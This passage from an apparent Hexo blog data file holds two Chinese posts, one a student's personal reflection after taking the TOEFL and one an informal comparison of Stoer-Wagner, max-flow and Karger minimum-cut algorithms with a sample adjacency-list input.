自己不能正视积累的过程。\n\n从心底里来说，我一直不信量变引起质变这样的论断。\n\n这也似乎很顺利的解释了别的事情，为什么我以前有能力在第一时间让别人刮目相看，但是后续无力？为什么看起来很辉煌，其实很单薄？看看经历过的感情。我可以说我就是个贱人。接受了这个论断，其实也慢慢好起来了呢。这个问题我还是避而不谈的好。放起来吧。 所以说呐，现在对于“踏实”这个从小说到大的词汇，真的有了新的认识。慢慢的看看自己，撕扯一下自己的心灵，或许真的可以让我更好的进步吧！\n\n2014/10/27 11:59 北京理工大学新一宿舍楼620四号床铺上\n\n","source":"_posts/U6495U626fU81eaU5df1.md","raw":"title: 撕扯自己\ndate: 2014-10-27 11:59:01\ntags: Notes\ncategories: Notes\n---\n考完托福，心里也是百感交集。眼看身边各位杀T战友一个个如释重负，想着身边的哥们YZ也是两个考试都已完结，心里不觉一阵怅然。你们都结束战斗了，而我还有下一次，还有接下来的一阵子的努力，一个人的努力。\n\n<!--more-->\n虽然如此，回到学校了还是没心没肺的玩了一下午一晚上。\n\n回头想想吧，还是一件很有意思的事情。问我昨天下午晚上玩的爽吗？好吧，答案肯定是一点都不爽。似乎有很多事情，只有在很忙的时候才觉得很有兴趣，才很愿意干。一旦决定好好放松一下，就真的没有什么事情可以刺激我那已经麻木的神经了。 早上起来，心里不知道为啥，一阵一阵抑制不住的恐慌。考试是不是过不去了？女朋友是不是又生气了？今天该干些什么才能让我学得更好？其实想下去，最惶恐的还是，以后的生活会不会一直是这个状态！\n\n印象中有人说过，一个人一辈子的状态总是很相似的，一辈子的操劳，或者一辈子的爱生活。 揣着沉甸甸的惶恐，愣愣的上个厕所，买点东西，回来发呆。想着想着就笑起来了。所谓自己没有那么轻松，应该就是没有那么热爱生活吧。\n\n低头看看表，10月27日11:11。北京又降温了，冷风刺骨，但也正是这冷风，把天空吹得格外明媚。往日在雾霾的包围中冲向操场的天台，哆哆嗦嗦拿出白纸写下一行一行的笔记，重复一遍一遍的口语。裹裹轻薄的外衣，拥抱一下自己，顺便跟自己说一句：“Warmer clothes are crucial for your health”。\n\n生活原本可以很可爱，很自由的。只不过有了欲望，欲望就会变成一条铁链，让真个人就变得不自由。 佛所说的无欲无求，还真是热爱生活快乐开心的真谛啊！ 说实话，我自己真的无比向往快乐，幻想的生活。最近星爷名作上映，想去！不是作，只是想认真感受一下“我的意中人是个盖世英雄，有一天他会踩着七色的云彩来娶我”的美好幻想，一个让我无论何时都热泪盈眶的幻想；认真感受一下“如果非要在这份爱上加上一个期限，我希望是……一万年……”的绝望和悲壮的画面，一个让我感受到男人的力量和无奈的画面。情绪，无论在什么时候都可以无限改变对任何事情的看法和感受。过一段时间再去体会同样的作品，加上自己的感受和印证，不得不说，有些作品真的是被我们低估了。\n\n很多时候我都在想，从小以来的教育究竟有多大的力量！可以完全造就不同的人的不同的性格。而我，很不幸，被深深地刻入了追求结果，不断追逐不断满足自己欲望的性格。悲观，虽然我不愿意这么说，确实是我面对很多事情的态度。想改，或许不是那么的容易。从小对于名利的追逐，造成了我整个人的情绪化，从小受惯了欺负，让我对别人的言行异常敏感。一句话包含了一点点的异常因素都会让我无限的放大，无限的折磨自己。还好，上帝在赐予我敏感心理的同时，给予了我隐藏自己情绪的能力。让我还能够继续勉强生活在这危机四伏关系复杂的圈子中。\n\n很久了，一直致力于能够改一下自己这个习惯，最后发现还是徒劳。小的时候那么纯真的年代很少有认可和鼓励，长大了还会有什么期待吗？所有人心里的鄙视都被套上了华丽的外衣，看到的永远是虚假无力的赞誉。有时候即使是真的夸奖，也会在自己心中被无声的冲走，填补自己心中心虚和无助的空洞。\n\n从小带来的自卑与心虚，只能用如今强撑起来的自信掩盖。不断的锻炼，不停地看各种书，不断地学习各种乐器，各种技能，不断地写一些代码，初衷都是为了填补心中自卑的空洞。这个空洞太大，以至于我必须想要用所有的时间去做一些“有价值”的事情。这种强撑的没有基础没有实质的自信，只是自己撑起一个巨大的壳子，证明自己很强大。岂不知这个壳子一捅就破，经不起推敲。一旦不小心戳到了痛处，这个巨大的壳子就会马上分崩离析，留给自己的只剩下一个蜷缩在一角的悲观无助的身影。\n\n这里似乎也很顺利了。我为什么学不好英语？很简单，自己的自卑让自己习惯于用最快的方式和最直接的办法获得实质性的价值。这么久了，除了被逼无奈的事情，自己从来没有认真的积累过。遇到这种需要积累的事情，虽然时间足够，但是自己总是无法面对自己不能立即获得收获的事实。平常的一篇阅读题，做的不好了大体看看再做下一套，希望能做得好一点。但是事实呢？能力没有任何的提升。太过于急功近利导致了自己不能正视积累的过程。\n\n从心底里来说，我一直不信量变引起质变这样的论断。\n\n这也似乎很顺利的解释了别的事情，为什么我以前有能力在第一时间让别人刮目相看，但是后续无力？为什么看起来很辉煌，其实很单薄？看看经历过的感情。我可以说我就是个贱人。接受了这个论断，其实也慢慢好起来了呢。这个问题我还是避而不谈的好。放起来吧。 所以说呐，现在对于“踏实”这个从小说到大的词汇，真的有了新的认识。慢慢的看看自己，撕扯一下自己的心灵，或许真的可以让我更好的进步吧！\n\n2014/10/27 11:59 北京理工大学新一宿舍楼620四号床铺上\n\n","slug":"U6495U626fU81eaU5df1","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v7001pwypdit02vx51","content":"<p>考完托福，心里也是百感交集。眼看身边各位杀T战友一个个如释重负，想着身边的哥们YZ也是两个考试都已完结，心里不觉一阵怅然。你们都结束战斗了，而我还有下一次，还有接下来的一阵子的努力，一个人的努力。</p>\n<a id=\"more\"></a>\n<p>虽然如此，回到学校了还是没心没肺的玩了一下午一晚上。</p>\n<p>回头想想吧，还是一件很有意思的事情。问我昨天下午晚上玩的爽吗？好吧，答案肯定是一点都不爽。似乎有很多事情，只有在很忙的时候才觉得很有兴趣，才很愿意干。一旦决定好好放松一下，就真的没有什么事情可以刺激我那已经麻木的神经了。 早上起来，心里不知道为啥，一阵一阵抑制不住的恐慌。考试是不是过不去了？女朋友是不是又生气了？今天该干些什么才能让我学得更好？其实想下去，最惶恐的还是，以后的生活会不会一直是这个状态！</p>\n<p>印象中有人说过，一个人一辈子的状态总是很相似的，一辈子的操劳，或者一辈子的爱生活。 揣着沉甸甸的惶恐，愣愣的上个厕所，买点东西，回来发呆。想着想着就笑起来了。所谓自己没有那么轻松，应该就是没有那么热爱生活吧。</p>\n<p>低头看看表，10月27日11:11。北京又降温了，冷风刺骨，但也正是这冷风，把天空吹得格外明媚。往日在雾霾的包围中冲向操场的天台，哆哆嗦嗦拿出白纸写下一行一行的笔记，重复一遍一遍的口语。裹裹轻薄的外衣，拥抱一下自己，顺便跟自己说一句：“Warmer clothes are crucial for your health”。</p>\n<p>生活原本可以很可爱，很自由的。只不过有了欲望，欲望就会变成一条铁链，让真个人就变得不自由。 佛所说的无欲无求，还真是热爱生活快乐开心的真谛啊！ 说实话，我自己真的无比向往快乐，幻想的生活。最近星爷名作上映，想去！不是作，只是想认真感受一下“我的意中人是个盖世英雄，有一天他会踩着七色的云彩来娶我”的美好幻想，一个让我无论何时都热泪盈眶的幻想；认真感受一下“如果非要在这份爱上加上一个期限，我希望是……一万年……”的绝望和悲壮的画面，一个让我感受到男人的力量和无奈的画面。情绪，无论在什么时候都可以无限改变对任何事情的看法和感受。过一段时间再去体会同样的作品，加上自己的感受和印证，不得不说，有些作品真的是被我们低估了。</p>\n<p>很多时候我都在想，从小以来的教育究竟有多大的力量！可以完全造就不同的人的不同的性格。而我，很不幸，被深深地刻入了追求结果，不断追逐不断满足自己欲望的性格。悲观，虽然我不愿意这么说，确实是我面对很多事情的态度。想改，或许不是那么的容易。从小对于名利的追逐，造成了我整个人的情绪化，从小受惯了欺负，让我对别人的言行异常敏感。一句话包含了一点点的异常因素都会让我无限的放大，无限的折磨自己。还好，上帝在赐予我敏感心理的同时，给予了我隐藏自己情绪的能力。让我还能够继续勉强生活在这危机四伏关系复杂的圈子中。</p>\n<p>很久了，一直致力于能够改一下自己这个习惯，最后发现还是徒劳。小的时候那么纯真的年代很少有认可和鼓励，长大了还会有什么期待吗？所有人心里的鄙视都被套上了华丽的外衣，看到的永远是虚假无力的赞誉。有时候即使是真的夸奖，也会在自己心中被无声的冲走，填补自己心中心虚和无助的空洞。</p>\n<p>从小带来的自卑与心虚，只能用如今强撑起来的自信掩盖。不断的锻炼，不停地看各种书，不断地学习各种乐器，各种技能，不断地写一些代码，初衷都是为了填补心中自卑的空洞。这个空洞太大，以至于我必须想要用所有的时间去做一些“有价值”的事情。这种强撑的没有基础没有实质的自信，只是自己撑起一个巨大的壳子，证明自己很强大。岂不知这个壳子一捅就破，经不起推敲。一旦不小心戳到了痛处，这个巨大的壳子就会马上分崩离析，留给自己的只剩下一个蜷缩在一角的悲观无助的身影。</p>\n<p>这里似乎也很顺利了。我为什么学不好英语？很简单，自己的自卑让自己习惯于用最快的方式和最直接的办法获得实质性的价值。这么久了，除了被逼无奈的事情，自己从来没有认真的积累过。遇到这种需要积累的事情，虽然时间足够，但是自己总是无法面对自己不能立即获得收获的事实。平常的一篇阅读题，做的不好了大体看看再做下一套，希望能做得好一点。但是事实呢？能力没有任何的提升。太过于急功近利导致了自己不能正视积累的过程。</p>\n<p>从心底里来说，我一直不信量变引起质变这样的论断。</p>\n<p>这也似乎很顺利的解释了别的事情，为什么我以前有能力在第一时间让别人刮目相看，但是后续无力？为什么看起来很辉煌，其实很单薄？看看经历过的感情。我可以说我就是个贱人。接受了这个论断，其实也慢慢好起来了呢。这个问题我还是避而不谈的好。放起来吧。 所以说呐，现在对于“踏实”这个从小说到大的词汇，真的有了新的认识。慢慢的看看自己，撕扯一下自己的心灵，或许真的可以让我更好的进步吧！</p>\n<p>2014/10/27 11:59 北京理工大学新一宿舍楼620四号床铺上</p>\n","excerpt":"<p>考完托福，心里也是百感交集。眼看身边各位杀T战友一个个如释重负，想着身边的哥们YZ也是两个考试都已完结，心里不觉一阵怅然。你们都结束战斗了，而我还有下一次，还有接下来的一阵子的努力，一个人的努力。</p>","more":"<p>虽然如此，回到学校了还是没心没肺的玩了一下午一晚上。</p>\n<p>回头想想吧，还是一件很有意思的事情。问我昨天下午晚上玩的爽吗？好吧，答案肯定是一点都不爽。似乎有很多事情，只有在很忙的时候才觉得很有兴趣，才很愿意干。一旦决定好好放松一下，就真的没有什么事情可以刺激我那已经麻木的神经了。 早上起来，心里不知道为啥，一阵一阵抑制不住的恐慌。考试是不是过不去了？女朋友是不是又生气了？今天该干些什么才能让我学得更好？其实想下去，最惶恐的还是，以后的生活会不会一直是这个状态！</p>\n<p>印象中有人说过，一个人一辈子的状态总是很相似的，一辈子的操劳，或者一辈子的爱生活。 揣着沉甸甸的惶恐，愣愣的上个厕所，买点东西，回来发呆。想着想着就笑起来了。所谓自己没有那么轻松，应该就是没有那么热爱生活吧。</p>\n<p>低头看看表，10月27日11:11。北京又降温了，冷风刺骨，但也正是这冷风，把天空吹得格外明媚。往日在雾霾的包围中冲向操场的天台，哆哆嗦嗦拿出白纸写下一行一行的笔记，重复一遍一遍的口语。裹裹轻薄的外衣，拥抱一下自己，顺便跟自己说一句：“Warmer clothes are crucial for your health”。</p>\n<p>生活原本可以很可爱，很自由的。只不过有了欲望，欲望就会变成一条铁链，让真个人就变得不自由。 佛所说的无欲无求，还真是热爱生活快乐开心的真谛啊！ 说实话，我自己真的无比向往快乐，幻想的生活。最近星爷名作上映，想去！不是作，只是想认真感受一下“我的意中人是个盖世英雄，有一天他会踩着七色的云彩来娶我”的美好幻想，一个让我无论何时都热泪盈眶的幻想；认真感受一下“如果非要在这份爱上加上一个期限，我希望是……一万年……”的绝望和悲壮的画面，一个让我感受到男人的力量和无奈的画面。情绪，无论在什么时候都可以无限改变对任何事情的看法和感受。过一段时间再去体会同样的作品，加上自己的感受和印证，不得不说，有些作品真的是被我们低估了。</p>\n<p>很多时候我都在想，从小以来的教育究竟有多大的力量！可以完全造就不同的人的不同的性格。而我，很不幸，被深深地刻入了追求结果，不断追逐不断满足自己欲望的性格。悲观，虽然我不愿意这么说，确实是我面对很多事情的态度。想改，或许不是那么的容易。从小对于名利的追逐，造成了我整个人的情绪化，从小受惯了欺负，让我对别人的言行异常敏感。一句话包含了一点点的异常因素都会让我无限的放大，无限的折磨自己。还好，上帝在赐予我敏感心理的同时，给予了我隐藏自己情绪的能力。让我还能够继续勉强生活在这危机四伏关系复杂的圈子中。</p>\n<p>很久了，一直致力于能够改一下自己这个习惯，最后发现还是徒劳。小的时候那么纯真的年代很少有认可和鼓励，长大了还会有什么期待吗？所有人心里的鄙视都被套上了华丽的外衣，看到的永远是虚假无力的赞誉。有时候即使是真的夸奖，也会在自己心中被无声的冲走，填补自己心中心虚和无助的空洞。</p>\n<p>从小带来的自卑与心虚，只能用如今强撑起来的自信掩盖。不断的锻炼，不停地看各种书，不断地学习各种乐器，各种技能，不断地写一些代码，初衷都是为了填补心中自卑的空洞。这个空洞太大，以至于我必须想要用所有的时间去做一些“有价值”的事情。这种强撑的没有基础没有实质的自信，只是自己撑起一个巨大的壳子，证明自己很强大。岂不知这个壳子一捅就破，经不起推敲。一旦不小心戳到了痛处，这个巨大的壳子就会马上分崩离析，留给自己的只剩下一个蜷缩在一角的悲观无助的身影。</p>\n<p>这里似乎也很顺利了。我为什么学不好英语？很简单，自己的自卑让自己习惯于用最快的方式和最直接的办法获得实质性的价值。这么久了，除了被逼无奈的事情，自己从来没有认真的积累过。遇到这种需要积累的事情，虽然时间足够，但是自己总是无法面对自己不能立即获得收获的事实。平常的一篇阅读题，做的不好了大体看看再做下一套，希望能做得好一点。但是事实呢？能力没有任何的提升。太过于急功近利导致了自己不能正视积累的过程。</p>\n<p>从心底里来说，我一直不信量变引起质变这样的论断。</p>\n<p>这也似乎很顺利的解释了别的事情，为什么我以前有能力在第一时间让别人刮目相看，但是后续无力？为什么看起来很辉煌，其实很单薄？看看经历过的感情。我可以说我就是个贱人。接受了这个论断，其实也慢慢好起来了呢。这个问题我还是避而不谈的好。放起来吧。 所以说呐，现在对于“踏实”这个从小说到大的词汇，真的有了新的认识。慢慢的看看自己，撕扯一下自己的心灵，或许真的可以让我更好的进步吧！</p>\n<p>2014/10/27 11:59 北京理工大学新一宿舍楼620四号床铺上</p>"},{"title":"最小割","date":"2015-04-05T21:18:13.000Z","_content":"悲催的最小割之路\n<!--more-->\n无向图的最小割，几百年前就干过的事情。一直以来Stoer-Wagner算法一条路撸到黑。ACM集训队留下来的代码也是百试不爽。偶然间听说一种算法叫做Karger的也可以处理最小割问题。姑且拿来写一写试试看了。\n最大流算法除外，其实目前看到的最小割算法都是基于把点粘合在一起来计算的。\n先上传统Stoer-Wagner算法。\n##Stoer-Wagner##\n这是一个神奇的算法。复杂度O($n^3$)。它利用最大生成树的原理来处理数据。算是有步骤地一步一步的找到该合并的点。具体操作如下\n这个算法的关键在于一个定理，叫做“**很简单的以至于不知道名字的定理**”，如下:\n在这个图中设定一个源点s，汇点t。假设我们现在已经求得了最小割\n1，s，t两个节点分别在最小割后节点集的两部分，那么s-t的割就是最小割了\n2，s，t两个节点都在最小割后节点集的一边，那么s-t合并之后，并不影响最小割的下一步求解\n基于这个理论，我们可以得出一个算法的关键结论：\n每次定义一组s，t。求出s-t的割，记录这个割，然后合并s-t。合并后我们就剩下n - 1个点。然后继续定义新的s-t。如果新的s-t的割小于原来的割，那么就更新最小割，继续合并新的s，t......直到最后变成两个点。\n这样做可以照顾以上两点。因为如果每次操作s-t的时候，如果s-t确实是最后的割，那么我们记录了这个割。如果不是，那么我们合并继续。所以这个算法一定是对的。\n\n那么问题来了，怎么求s-t的割呢？\n分成两个子问题。如果指定了s-t,我们可以使用最大流的各种算法来求出。但是现在没有指定s-t，我们可以在点里边任意选择s-t嘛。所以就引申出来一个算法，最大生成树。\n\n结论是这样的\n>利用prim算法求最大生成树，每个节点不断的加入到图中，最后加入的两个节点之间的割，就等于最后一个加入节点距离源点的距离。也就是把倒数第二个加入的节点当作s，最后一个节点当作t，这个割就是最后一个节点的距离数\n\n证明\n>我也不知道\n\nPS：这个证明我还在咨询大神，弄懂了再来更新\n具体的算法操作代码放在最后。\n\n##Dinic##\n也就是最大流啦。复杂度O($n^3$m)一个很著名的定理，最大流就是最小割。所以如果指定了最大流的源汇点，使用诸如SAP，Dinic等等的算法求出最大流，得到的结果就是最小割。\n但是如果要求全局最小割呢，就需要枚举汇点了。不过上边的Stoer-Wagner算法有说，找到的源汇点是可以合并的。所以我们可以在每次Dinic求完最小割之后合并，再继续求下一个过程。复杂度可以显著降低。不过我觉得没必要了。还麻烦，直接枚举汇点好了。\n**这种算法真的是没啥意思的，复杂度高还难写，为啥不用Stoer-Wagner呢，好写高效**\n其实最大流算法和Stoer-Wagner的算法的最大区别在于，Stoer-Wagner使用了这个问题可以自己指定源点汇点的特点，方便的自行指定求出源汇点的割。最大流则是被动指定。效率肯定比不上Stoer-Wagner了。\n\n代码放在最后了啊\n\n##Karger##\n这是一个神奇的算法！\n说它神奇，是因为它简单。\n说它神奇，是因为它复杂。\n说它神奇，是因为这个算法太矛盾了。\n话说当年Karger大牛在读博士的时候灵机一动，想出了这个空前绝后超级简单的算法。以至于后人无法再直视Karger。\n这个算法的理论复杂度是O($n^2ln^{O(1)}n$),但是写出来后就不是这样的了。\n首先这个算法是这样的。还是借用上边Stoer-Wagner的合并操作说明。Stoer-Wagner是找到s-t后合并s-t，但是Karger是在每次过程中，随机找一条边的两个点来合并。然后不断合并合并直到剩下两个点为止。然后这两个点中间的边就是最后的割了。这个割当然不一定是最小割。但是我们可以试嘛。论文说试上$n^2$次就可以达到满意的结果了。成吧。写写试试看？\n本来这个算法很早就发明了。为啥到现在应用都不广泛呢？其中必有原因。写写后发现。实际上的复杂度要高得多。\n$n^2$的迭代次数暂且不说。就说我们“随机取一条边”这个问题。如果我们用邻接表来存放数据点，那么随机取边就需要O(n)的复杂度了。因为毕竟我们要遍历嘛。如果用邻接矩阵来存放呢？我们需要不断的尝试边，然后看看有没有可用边。这个就看是稀疏图还是稠密图了。稀疏图就惨了，稠密图还好。\n各种纠结，参考网上大牛代码后，决定用邻接表了。\n优化了很久，发现不论如何，随机找边这个操作也在O(n)上，合并也几乎是O(n)。同时为了快速我用的指针，内存泄漏问题也不容忽视。同时中间还有无数个操作需要寻找一个点的位置。这种事情又是O(n)了。大体看了一下，如果是稠密图，因为我们每次迭代前都需要重新更新一下图数据，几乎是需要O($n^4$)的。。。\n\n代码细节：\n邻接表中，每个点节点VNode存放的是每个节点，后边跟的一串是这个节点相连的边\n每个ENode就是VNode连接的节点\n所以这是一种看起来复杂度很低，实际上写起来微小操作特别耗时的算法。几乎还是不如Stoer-Wagner。\n代码放在最后。。。\n\n##代码区域##\n输入实例，完全按照邻接表的形式输入。不知道什么叫做邻接表的，看看这个实例也就懂了\n每行的第一个数字，也就是VNode，表示这一行表示的点的标号\n后边跟的一串是这个节点相连的边\n###input###\n```\n0 1 2 3\n1 0 2 3\n2 0 1 3 4\n3 0 1 2 4\n4 2 3\n```\n代表的图形是这样的\n![代表图](/image/20150405234149.png)\n\n","source":"_posts/U6700U5c0fU5272.md","raw":"title: \"最小割\"\ndate: 2015-04-05 21:18:13\ntags: Algorithm\ncategories: Algorithm\n---\n悲催的最小割之路\n<!--more-->\n无向图的最小割，几百年前就干过的事情。一直以来Stoer-Wagner算法一条路撸到黑。ACM集训队留下来的代码也是百试不爽。偶然间听说一种算法叫做Karger的也可以处理最小割问题。姑且拿来写一写试试看了。\n最大流算法除外，其实目前看到的最小割算法都是基于把点粘合在一起来计算的。\n先上传统Stoer-Wagner算法。\n##Stoer-Wagner##\n这是一个神奇的算法。复杂度O($n^3$)。它利用最大生成树的原理来处理数据。算是有步骤地一步一步的找到该合并的点。具体操作如下\n这个算法的关键在于一个定理，叫做“**很简单的以至于不知道名字的定理**”，如下:\n在这个图中设定一个源点s，汇点t。假设我们现在已经求得了最小割\n1，s，t两个节点分别在最小割后节点集的两部分，那么s-t的割就是最小割了\n2，s，t两个节点都在最小割后节点集的一边，那么s-t合并之后，并不影响最小割的下一步求解\n基于这个理论，我们可以得出一个算法的关键结论：\n每次定义一组s，t。求出s-t的割，记录这个割，然后合并s-t。合并后我们就剩下n - 1个点。然后继续定义新的s-t。如果新的s-t的割小于原来的割，那么就更新最小割，继续合并新的s，t......直到最后变成两个点。\n这样做可以照顾以上两点。因为如果每次操作s-t的时候，如果s-t确实是最后的割，那么我们记录了这个割。如果不是，那么我们合并继续。所以这个算法一定是对的。\n\n那么问题来了，怎么求s-t的割呢？\n分成两个子问题。如果指定了s-t,我们可以使用最大流的各种算法来求出。但是现在没有指定s-t，我们可以在点里边任意选择s-t嘛。所以就引申出来一个算法，最大生成树。\n\n结论是这样的\n>利用prim算法求最大生成树，每个节点不断的加入到图中，最后加入的两个节点之间的割，就等于最后一个加入节点距离源点的距离。也就是把倒数第二个加入的节点当作s，最后一个节点当作t，这个割就是最后一个节点的距离数\n\n证明\n>我也不知道\n\nPS：这个证明我还在咨询大神，弄懂了再来更新\n具体的算法操作代码放在最后。\n\n##Dinic##\n也就是最大流啦。复杂度O($n^3$m)一个很著名的定理，最大流就是最小割。所以如果指定了最大流的源汇点，使用诸如SAP，Dinic等等的算法求出最大流，得到的结果就是最小割。\n但是如果要求全局最小割呢，就需要枚举汇点了。不过上边的Stoer-Wagner算法有说，找到的源汇点是可以合并的。所以我们可以在每次Dinic求完最小割之后合并，再继续求下一个过程。复杂度可以显著降低。不过我觉得没必要了。还麻烦，直接枚举汇点好了。\n**这种算法真的是没啥意思的，复杂度高还难写，为啥不用Stoer-Wagner呢，好写高效**\n其实最大流算法和Stoer-Wagner的算法的最大区别在于，Stoer-Wagner使用了这个问题可以自己指定源点汇点的特点，方便的自行指定求出源汇点的割。最大流则是被动指定。效率肯定比不上Stoer-Wagner了。\n\n代码放在最后了啊\n\n##Karger##\n这是一个神奇的算法！\n说它神奇，是因为它简单。\n说它神奇，是因为它复杂。\n说它神奇，是因为这个算法太矛盾了。\n话说当年Karger大牛在读博士的时候灵机一动，想出了这个空前绝后超级简单的算法。以至于后人无法再直视Karger。\n这个算法的理论复杂度是O($n^2ln^{O(1)}n$),但是写出来后就不是这样的了。\n首先这个算法是这样的。还是借用上边Stoer-Wagner的合并操作说明。Stoer-Wagner是找到s-t后合并s-t，但是Karger是在每次过程中，随机找一条边的两个点来合并。然后不断合并合并直到剩下两个点为止。然后这两个点中间的边就是最后的割了。这个割当然不一定是最小割。但是我们可以试嘛。论文说试上$n^2$次就可以达到满意的结果了。成吧。写写试试看？\n本来这个算法很早就发明了。为啥到现在应用都不广泛呢？其中必有原因。写写后发现。实际上的复杂度要高得多。\n$n^2$的迭代次数暂且不说。就说我们“随机取一条边”这个问题。如果我们用邻接表来存放数据点，那么随机取边就需要O(n)的复杂度了。因为毕竟我们要遍历嘛。如果用邻接矩阵来存放呢？我们需要不断的尝试边，然后看看有没有可用边。这个就看是稀疏图还是稠密图了。稀疏图就惨了，稠密图还好。\n各种纠结，参考网上大牛代码后，决定用邻接表了。\n优化了很久，发现不论如何，随机找边这个操作也在O(n)上，合并也几乎是O(n)。同时为了快速我用的指针，内存泄漏问题也不容忽视。同时中间还有无数个操作需要寻找一个点的位置。这种事情又是O(n)了。大体看了一下，如果是稠密图，因为我们每次迭代前都需要重新更新一下图数据，几乎是需要O($n^4$)的。。。\n\n代码细节：\n邻接表中，每个点节点VNode存放的是每个节点，后边跟的一串是这个节点相连的边\n每个ENode就是VNode连接的节点\n所以这是一种看起来复杂度很低，实际上写起来微小操作特别耗时的算法。几乎还是不如Stoer-Wagner。\n代码放在最后。。。\n\n##代码区域##\n输入实例，完全按照邻接表的形式输入。不知道什么叫做邻接表的，看看这个实例也就懂了\n每行的第一个数字，也就是VNode，表示这一行表示的点的标号\n后边跟的一串是这个节点相连的边\n###input###\n```\n0 1 2 3\n1 0 2 3\n2 0 1 3 4\n3 0 1 2 4\n4 2 3\n```\n代表的图形是这样的\n![代表图](/image/20150405234149.png)\n\n","slug":"U6700U5c0fU5272","published":1,"updated":"2016-06-08T20:21:15.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ciph681v9001uwypd53s6viqt","content":"<p>悲催的最小割之路<br><a id=\"more\"></a><br>无向图的最小割，几百年前就干过的事情。一直以来Stoer-Wagner算法一条路撸到黑。ACM集训队留下来的代码也是百试不爽。偶然间听说一种算法叫做Karger的也可以处理最小割问题。姑且拿来写一写试试看了。<br>最大流算法除外，其实目前看到的最小割算法都是基于把点粘合在一起来计算的。<br>先上传统Stoer-Wagner算法。</p>\n<p>##Stoer-Wagner##<br>这是一个神奇的算法。复杂度O($n^3$)。它利用最大生成树的原理来处理数据。算是有步骤地一步一步的找到该合并的点。具体操作如下<br>这个算法的关键在于一个定理，叫做“<strong>很简单的以至于不知道名字的定理</strong>”，如下:<br>在这个图中设定一个源点s，汇点t。假设我们现在已经求得了最小割<br>1，s，t两个节点分别在最小割后节点集的两部分，那么s-t的割就是最小割了<br>2，s，t两个节点都在最小割后节点集的一边，那么s-t合并之后，并不影响最小割的下一步求解<br>基于这个理论，我们可以得出一个算法的关键结论：<br>每次定义一组s，t。求出s-t的割，记录这个割，然后合并s-t。合并后我们就剩下n - 1个点。然后继续定义新的s-t。如果新的s-t的割小于原来的割，那么就更新最小割，继续合并新的s，t……直到最后变成两个点。<br>这样做可以照顾以上两点。因为如果每次操作s-t的时候，如果s-t确实是最后的割，那么我们记录了这个割。如果不是，那么我们合并继续。所以这个算法一定是对的。</p>\n<p>那么问题来了，怎么求s-t的割呢？<br>分成两个子问题。如果指定了s-t,我们可以使用最大流的各种算法来求出。但是现在没有指定s-t，我们可以在点里边任意选择s-t嘛。所以就引申出来一个算法，最大生成树。</p>\n<p>结论是这样的</p>\n<blockquote>\n<p>利用prim算法求最大生成树，每个节点不断的加入到图中，最后加入的两个节点之间的割，就等于最后一个加入节点距离源点的距离。也就是把倒数第二个加入的节点当作s，最后一个节点当作t，这个割就是最后一个节点的距离数</p>\n</blockquote>\n<p>证明</p>\n<blockquote>\n<p>我也不知道</p>\n</blockquote>\n<p>PS：这个证明我还在咨询大神，弄懂了再来更新<br>具体的算法操作代码放在最后。</p>\n<p>##Dinic##<br>也就是最大流啦。复杂度O($n^3$m)一个很著名的定理，最大流就是最小割。所以如果指定了最大流的源汇点，使用诸如SAP，Dinic等等的算法求出最大流，得到的结果就是最小割。<br>但是如果要求全局最小割呢，就需要枚举汇点了。不过上边的Stoer-Wagner算法有说，找到的源汇点是可以合并的。所以我们可以在每次Dinic求完最小割之后合并，再继续求下一个过程。复杂度可以显著降低。不过我觉得没必要了。还麻烦，直接枚举汇点好了。<br><strong>这种算法真的是没啥意思的，复杂度高还难写，为啥不用Stoer-Wagner呢，好写高效</strong><br>其实最大流算法和Stoer-Wagner的算法的最大区别在于，Stoer-Wagner使用了这个问题可以自己指定源点汇点的特点，方便的自行指定求出源汇点的割。最大流则是被动指定。效率肯定比不上Stoer-Wagner了。</p>\n<p>代码放在最后了啊</p>\n<p>##Karger##<br>这是一个神奇的算法！<br>说它神奇，是因为它简单。<br>说它神奇，是因为它复杂。<br>说它神奇，是因为这个算法太矛盾了。<br>话说当年Karger大牛在读博士的时候灵机一动，想出了这个空前绝后超级简单的算法。以至于后人无法再直视Karger。<br>这个算法的理论复杂度是O($n^2ln^{O(1)}n$),但是写出来后就不是这样的了。<br>首先这个算法是这样的。还是借用上边Stoer-Wagner的合并操作说明。Stoer-Wagner是找到s-t后合并s-t，但是Karger是在每次过程中，随机找一条边的两个点来合并。然后不断合并合并直到剩下两个点为止。然后这两个点中间的边就是最后的割了。这个割当然不一定是最小割。但是我们可以试嘛。论文说试上$n^2$次就可以达到满意的结果了。成吧。写写试试看？<br>本来这个算法很早就发明了。为啥到现在应用都不广泛呢？其中必有原因。写写后发现。实际上的复杂度要高得多。<br>$n^2$的迭代次数暂且不说。就说我们“随机取一条边”这个问题。如果我们用邻接表来存放数据点，那么随机取边就需要O(n)的复杂度了。因为毕竟我们要遍历嘛。如果用邻接矩阵来存放呢？我们需要不断的尝试边，然后看看有没有可用边。这个就看是稀疏图还是稠密图了。稀疏图就惨了，稠密图还好。<br>各种纠结，参考网上大牛代码后，决定用邻接表了。<br>优化了很久，发现不论如何，随机找边这个操作也在O(n)上，合并也几乎是O(n)。同时为了快速我用的指针，内存泄漏问题也不容忽视。同时中间还有无数个操作需要寻找一个点的位置。这种事情又是O(n)了。大体看了一下，如果是稠密图，因为我们每次迭代前都需要重新更新一下图数据，几乎是需要O($n^4$)的。。。</p>\n<p>代码细节：<br>邻接表中，每个点节点VNode存放的是每个节点，后边跟的一串是这个节点相连的边<br>每个ENode就是VNode连接的节点<br>所以这是一种看起来复杂度很低，实际上写起来微小操作特别耗时的算法。几乎还是不如Stoer-Wagner。<br>代码放在最后。。。</p>\n<p>##代码区域##<br>输入实例，完全按照邻接表的形式输入。不知道什么叫做邻接表的，看看这个实例也就懂了<br>每行的第一个数字，也就是VNode，表示这一行表示的点的标号<br>后边跟的一串是这个节点相连的边</p>\n<p>###input###<br><figure class=\"highlight basic\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"symbol\">0 </span><span class=\"number\">1</span> <span class=\"number\">2</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"symbol\">1 </span><span class=\"number\">0</span> <span class=\"number\">2</span> <span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"symbol\">2 </span><span class=\"number\">0</span> <span class=\"number\">1</span> <span class=\"number\">3</span> <span class=\"number\">4</span></span><br><span 